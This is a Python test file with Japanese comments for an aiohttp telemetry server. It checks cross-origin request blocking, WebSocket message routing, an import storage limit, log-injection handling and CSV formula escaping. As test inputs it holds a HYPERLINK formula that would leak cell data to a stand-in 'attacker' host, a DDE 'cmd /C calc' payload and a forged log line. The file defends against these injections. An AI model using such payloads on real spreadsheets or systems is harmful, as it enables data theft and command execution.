"""#642 / #643: HTTP/WebSocket の越境防御と CSV の無害化(aiohttp のテストクライアント)。

- 別オリジンの Origin / Sec-Fetch-Site: cross-site は /ws・/api/laps/import・/api/diag が 403
- 同一オリジン・Origin 無し(curl 等)は従来どおり
- driver_response は /ws?role=engineer のソケットにだけ届く
- gt7data_imported/ の総量上限で 507
- ログの path に改行を混ぜても 1 行
- CSV / fastf1 の文字列セルの数式プレフィックスに ' が付く、fields は英数字と _ だけ
"""
import asyncio
import json
import logging
import os
import sys

from aiohttp import FormData

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

import main  # noqa: E402
from test_http_api import env, call, LAPS  # noqa: E402,F401  (env: pytest フィクスチャ)

LAP = "2026-10-08_17_43_40_CAR-63_Lap-3.json"


def _foreign(c):
    """テストサーバーと別オリジンの Origin ヘッダ。"""
    return {"Origin": "https://evil.example"}


def _same(c):
    return {"Origin": f"http://{c.host}:{c.port}"}


def _form(payload=b"timestamp,car_id\n"):
    form = FormData()
    form.add_field("file", payload, filename="x.csv", content_type="text/csv")
    return form


# ---------------------------------------------------------------- Origin(#642)

def test_cross_site_requests_are_rejected_but_same_origin_and_no_origin_pass(env):
    async def fn(c):
        r = await c.post("/api/laps/import", data=_form(), headers=_foreign(c)); assert r.status == 403
        r = await c.post("/api/laps/import", data=_form(), headers={"Sec-Fetch-Site": "cross-site"})
        assert r.status == 403
        r = await c.post("/api/laps/import", data=_form(), headers={"Origin": "null"}); assert r.status == 403
        r = await c.post("/api/diag", data=b"{}", headers=_foreign(c)); assert r.status == 403
        r = await c.get("/ws", headers=_foreign(c)); assert r.status == 403
        # 同一オリジン / Origin 無し / same-origin は通る(中身の検証で 400 になるのは従来どおり)
        r = await c.post("/api/laps/import", data=_form(), headers=_same(c)); assert r.status == 400
        r = await c.post("/api/laps/import", data=_form()); assert r.status == 400
        r = await c.post("/api/laps/import", data=_form(), headers={"Sec-Fetch-Site": "same-origin"})
        assert r.status == 400
        r = await c.post("/api/diag", data=json.dumps({"v": 1}), headers=_same(c)); assert r.status == 204
    call(fn)


def test_websocket_same_origin_ok_and_driver_response_only_reaches_engineer(env):
    async def fn(c):
        async with c.ws_connect("/ws", headers=_same(c)) as dash, \
                c.ws_connect("/ws?role=engineer", headers=_same(c)) as eng:
            await dash.send_str(json.dumps({"type": "driver_response", "response": "OK"}))
            msg = await asyncio.wait_for(eng.receive_json(), timeout=3)
            assert msg == {"type": "driver_response", "response": "OK"}
            # ダッシュボード側には届かない(届くとテレメトリとして処理され解析状態がリセットされる)
            with __import__("pytest").raises(asyncio.TimeoutError):
                await asyncio.wait_for(dash.receive(), timeout=0.5)
            # engineer_message は従来どおり全員へ
            await eng.send_str(json.dumps({"type": "engineer_message", "text": "box", "severity": "notice"}))
            got = await asyncio.wait_for(dash.receive_json(), timeout=3)
            assert got["type"] == "engineer_message" and got["text"] == "box"
        for _ in range(40):                      # 切断後の後片付け(finally)が終わるのを少し待つ
            if not main.engineer_clients and not main.websocket_clients:
                break
            await asyncio.sleep(0.05)
        assert not main.engineer_clients and not main.websocket_clients
    call(fn)


def test_cross_site_helper_compares_host_and_port():
    class Req:
        def __init__(self, headers, host="abem02.local", port=8080):
            self.headers = headers
            self.url = type("U", (), {"host": host, "port": port})()
    f = main._cross_site_request
    assert f(Req({})) is False
    assert f(Req({"Origin": "https://abem02.local:8080"})) is False
    assert f(Req({"Origin": "https://abem02.local"})) is True          # 既定ポート 443 != 8080
    assert f(Req({"Origin": "https://192.168.1.129:8080"})) is True    # 別ホスト名
    assert f(Req({"Origin": "https://abem02.local:8080", "Sec-Fetch-Site": "cross-site"})) is True
    assert f(Req({"Origin": "not a url"})) is True
    assert f(Req({"Origin": "https://abem02.local:8080", "Sec-Fetch-Site": "same-origin"})) is False
    assert f(Req({"Origin": "https://[::1]:8080"}, host="::1", port=8080)) is False      # IPv6 リテラル
    assert f(Req({"Origin": "https://[::1]:8080"}, host="abem02.local", port=8080)) is True


# ---------------------------------------------------------------- 総量上限(#642)

def test_import_refused_when_storage_full(env, monkeypatch):
    async def fn(c):
        monkeypatch.setattr(main, "IMPORT_MAX_TOTAL_BYTES", 10)
        (env["imp"] / "old.json").write_bytes(b"x" * 10)
        r = await c.post("/api/laps/import", data=_form()); body = await r.json()
        assert r.status == 507 and "full" in body["error"]
    call(fn)


# ---------------------------------------------------------------- ログ(#642)

def test_log_line_stays_single_line_with_newline_in_path(env, caplog):
    async def fn(c):
        with caplog.at_level(logging.INFO, logger=main.logger.name):
            r = await c.get("/x%0A2026-10-16 - INFO - Saved lap data: fake.json")
            assert r.status == 404
        lines = [rec.getMessage() for rec in caplog.records if rec.getMessage().startswith("GET ")]
        assert len(lines) == 1 and "\n" not in lines[0] and "\\x0a" in lines[0]
    call(fn)


# ---------------------------------------------------------------- CSV(#643)

def test_csv_cell_neutralises_formula_prefixes():
    f = main._csv_cell
    assert f("=HYPERLINK(1)") == "'=HYPERLINK(1)" and f("+1") == "'+1" and f("-1") == "'-1"
    assert f("@x") == "'@x" and f("\tx") == "'\tx" and f("\rx") == "'\rx"
    assert f("spa") == "spa" and f(-1.5) == -1.5 and f(0) == 0 and f(None) is None


def test_exported_csv_escapes_imported_formula_strings_and_rejects_bad_fields(env):
    async def fn(c):
        r = await c.get("/api/laps/" + LAP + "?format=csv&every=1"); csv_text = await r.text()
        lines = csv_text.lstrip("﻿").splitlines()
        header = lines[0].split(",")
        i = header.index("course_name_en")
        rows = [lines[1].split(",")]
        rows[0][i] = '=HYPERLINK("http://attacker/"&A1;"click")'
        payload = (lines[0] + "\n" + ",".join(rows[0]) + "\n").encode("utf-8")
        r = await c.post("/api/laps/import", data=_form(payload)); body = await r.json()
        assert r.status == 201, body
        f = body["file"]
        r = await c.get("/api/laps/" + f + "?format=csv&every=1"); out = await r.text()
        assert "'=HYPERLINK" in out and ',=HYPERLINK' not in out
        # fastf1 側の行変換も同じ無害化を通る(timestamp 列は 2 行目以降が任意文字列で取り込まれる)
        assert main._fastf1_row({"timestamp": "=cmd|' /C calc'!A0"}, ("timestamp",)) == ["'=cmd|' /C calc'!A0"]
        r = await c.get("/api/laps/" + LAP + "?format=csv&fields=%3Dcmd%7C'/C%20calc'!A0")
        assert r.status == 400
        r = await c.get("/api/laps/" + LAP + "?format=csv&fields=speed_kmh,timestamp"); assert r.status == 200
    call(fn)
